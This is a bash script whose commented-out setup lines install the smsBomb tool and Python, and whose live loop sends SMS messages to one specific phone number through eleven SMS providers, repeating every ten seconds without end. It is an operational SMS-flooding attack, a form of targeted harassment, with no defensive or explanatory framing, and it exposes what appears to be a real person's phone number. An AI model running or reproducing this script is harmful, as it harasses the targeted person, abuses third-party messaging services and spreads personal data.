#!/bin/bash

#git clone https://github.com/shellvon/smsBomb
#git clone https://github.com/yyuu/pyenv.git ~/.pyenv
#echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.zshrc
#echo 'export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.zshrc
#echo 'eval "$(pyenv init -)"' >> ~/.zshrc

#sudo apt-get install libbz2-dev libgdbm-dev liblzma-dev libreadline-dev libsqlite3-dev libssl-dev tcl-dev tk-dev dpkg-dev
#pyenv install 3.6.4
#pyenv global 3.6.4

#pip install -r requirements.txt
#pip install -r requirements-gui.txt
##sudo apt-get install libgl1-mesa-dev libglu1-mesa-dev freeglut3-dev

while true
do
python -m smsBomb -t 13501851042 -p aliyun -m yue
python -m smsBomb -t 13501851042 -p cl253  -m yue
python -m smsBomb -t 13501851042 -p juhe  -m yue
python -m smsBomb -t 13501851042 -p luosimao  -m yue
python -m smsBomb -t 13501851042 -p miaodi -m yue
python -m smsBomb -t 13501851042 -p netease -m yue
python -m smsBomb -t 13501851042 -p normal -m yue
python -m smsBomb -t 13501851042 -p smsbao -m yue
python -m smsBomb -t 13501851042 -p tencent -m yue
python -m smsBomb -t 13501851042 -p ucp -m yue
python -m smsBomb -t 13501851042 -p yunpian -m yue

sleep 10
done

exit 0

